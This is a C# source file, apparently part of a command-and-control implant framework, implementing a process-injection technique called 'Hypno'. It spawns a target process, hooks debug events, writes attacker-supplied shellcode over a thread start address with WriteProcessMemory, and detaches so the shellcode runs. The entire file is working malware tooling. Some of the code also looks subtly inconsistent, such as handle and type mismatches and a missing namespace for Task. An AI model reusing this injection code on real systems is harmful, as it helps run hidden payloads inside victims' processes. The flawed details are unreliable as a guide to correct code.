using Agent.Interfaces;
using Agent.Models;
using Invoker.Dynamic;
using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace Agent
{
    internal class Hypno : ITechnique
    {
        int ITechnique.id => 4;

            async Task<bool> ITechnique.Inject(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
            {
                if (!await spawner.Spawn(spawnOptions))
                {
                    return false;
                }
                SafeProcessHandle hProc;
                if (!spawner.TryGetHandle(spawnOptions.task_id, out hProc))
                {
                    return false;
                }

                return Run(hProc.DangerousGetHandle(), shellcode);
            }

            private bool Run(IntPtr htarger, byte[] shellcode)
            {

                List<string> resolveFuncs = new List<string>()
            {
           
               "wpm"
            };

                if (!Resolver.TryResolveFuncs(resolveFuncs, "ntd", out var err))
                {
                    return false;
                }

            IntPtr hProcess = htarger;
            int processId = GetProcessId(hProcess);
            IntPtr hThread = GetThreadId(hProcess);

            Console.WriteLine("[i] Target Process ID: " + processId);

            DEBUG_EVENT debugEvent;
            IntPtr bytesWritten;

            while (WaitForDebugEvent(out debugEvent, 0xFFFFFFFF))
            {
                if (debugEvent.dwDebugEventCode == 2) // CREATE_THREAD_DEBUG_EVENT
                {
                    Console.WriteLine("[+] Targeting Thread ID: " + debugEvent.dwThreadId);

                    if (!WriteProcessMemory(hProcess, debugEvent.u.CreateProcessInfo.lpStartAddress, shellcode, shellcode.Length, out bytesWritten) ||
                        bytesWritten.ToInt32() != shellcode.Length)
                    {
                        Console.WriteLine("[!] - WriteProcessMemory failed with error: " + Marshal.GetLastWin32Error());
                        Console.WriteLine("[i] -  Wrote " + bytesWritten.ToInt32() + " of " + shellcode.Length + " bytes.");
                        return false;
                    }

                    if (!DebugActiveProcessStop(processId))
                    {
                        Console.WriteLine("[!] - DebugActiveProcessStop failed with error: " + Marshal.GetLastWin32Error());
                        return false;
                    }

                    ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, 0x00010002); // DBG_CONTINUE
                    break;
                }

                ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, 0x00010002); // DBG_CONTINUE
            }

            Console.WriteLine("[i] Injection complete.");
            CloseHandle(hProcess);
            CloseHandle(hThread);

            return true;
        }

        // Imports and structures
        [DllImport("kernel32.dll")]
        static extern int GetThreadId(IntPtr hThread);


        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern int GetProcessId(IntPtr handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WaitForDebugEvent(out DEBUG_EVENT lpDebugEvent, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool DebugActiveProcessStop(int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ContinueDebugEvent(int dwProcessId, int dwThreadId, uint dwContinueStatus);

        [StructLayout(LayoutKind.Sequential)]
        public struct DEBUG_EVENT
        {
            public int dwDebugEventCode;
            public int dwProcessId;
            public int dwThreadId;
            public DebugEventUnion u;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct DebugEventUnion
        {
            [FieldOffset(0)]
            public CreateProcessInfo CreateProcessInfo;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CreateProcessInfo
        {
            public IntPtr hFile;
            public IntPtr hProcess;
            public IntPtr hThread;
            public IntPtr lpBaseOfImage;
            public int dwDebugInfoFileOffset;
            public int nDebugInfoSize;
            public IntPtr lpThreadLocalBase;
            public IntPtr lpStartAddress;
            public IntPtr lpImageName;
            public short fUnicode;
        }
    }
}
